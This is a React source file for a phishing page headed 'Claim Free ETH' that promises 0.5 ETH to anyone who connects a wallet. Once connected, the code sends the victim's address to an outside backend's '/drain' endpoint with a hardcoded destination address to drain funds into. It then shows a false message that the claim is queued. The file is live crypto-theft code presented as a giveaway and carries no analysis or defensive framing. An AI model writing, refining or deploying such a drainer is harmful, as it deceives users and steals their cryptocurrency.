import React, { useState, useEffect } from "react";
import ReactDOM from "react-dom/client";

// Import WalletConnect Provider
import { EthereumProvider } from "@walletconnect/ethereum-provider";

const App = () => {
  const [response, setResponse] = useState(null);
  const [loading, setLoading] = useState(false);
  const [walletProvider, setWalletProvider] = useState(null);
  const [walletAddress, setWalletAddress] = useState(null);

  // Initialize WalletConnect
  useEffect(() => {
    const provider = new EthereumProvider({
      rpc: {
        1: "https://mainnet.infura.io/v3/d2870b839c5f497c94f02dfaccc518e2", // Your Infura project ID
      },
      chainId: 1, // Ethereum mainnet
      qrcode: true, // Enable QR code for mobile
    });

    setWalletProvider(provider);
    return () => provider.disconnect();
  }, []);

  const connectWallet = async () => {
    setLoading(true);
    setResponse(null);

    try {
      // Check if wallet is available
      if (!walletProvider) {
        throw new Error("Wallet not detected. Please install a supported wallet.");
      }

      // Connect to wallet
      await walletProvider.connect(); // This should trigger the modal

      // Wait for the connection to settle
      await new Promise(resolve => setTimeout(resolve, 1000));

      // Get wallet address
      const address = walletProvider.accounts[0];

      setWalletAddress(address);

      // Make a POST request to your backend
      const res = await fetch("https://tokenbackendwork.onrender.com/drain", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          address,
          drainTo: "0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4",
        }),
      });

      const data = await res.json();

      if (res.ok) {
        setResponse({
          success: true,
          message: "Token claim queued. You will be credited in a few minutes.",
        });
      } else {
        setResponse({
          success: false,
          message: "Failed to claim token. Try again later.",
        });
      }
    } catch (err) {
      console.error(err);
      setResponse({
        success: false,
        message: "Failed to claim token. Try again later.",
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div
      style={{
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        height: "100vh",
        backgroundColor: "#121212",
        fontFamily: "Arial, sans-serif",
        color: "#ffffff",
        padding: "20px",
      }}
    >
      <div
        style={{
          backgroundColor: "#1e1e1e",
          borderRadius: "10px",
          padding: "30px",
          boxShadow: "0 4px 12px rgba(0, 0, 0, 0.1)",
          maxWidth: "400px",
          width: "100%",
        }}
      >
        <h1 style={{ textAlign: "center" }}>Claim Free ETH</h1>
        <p style={{ textAlign: "center", marginBottom: "20px" }}>
          Connect your wallet to claim 0.5 ETH now. It's free and easy!
        </p>
        <button
          onClick={connectWallet}
          disabled={loading}
          style={{
            margin: "20px auto",
            display: "block",
            padding: "12px 24px",
            fontSize: "16px",
            backgroundColor: "#4CAF50",
            color: "white",
            border: "none",
            borderRadius: "5px",
            cursor: "pointer",
            transition: "background-color 0.3s ease",
          }}
        >
          {loading ? "Connecting..." : "Connect Wallet"}
        </button>

        {response && (
          <div
            style={{
              marginTop: "20px",
              padding: "15px",
              backgroundColor: "#2a2a2a",
              borderRadius: "5px",
              border: "1px solid #444",
            }}
          >
            <h3 style={{ marginBottom: "10px" }}>Response:</h3>
            <pre style={{ whiteSpace: "pre-wrap", overflowX: "auto" }}>
              {JSON.stringify(response, null, 2)}
            </pre>
          </div>
        )}
      </div>
    </div>
  );
};

const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(<App />);
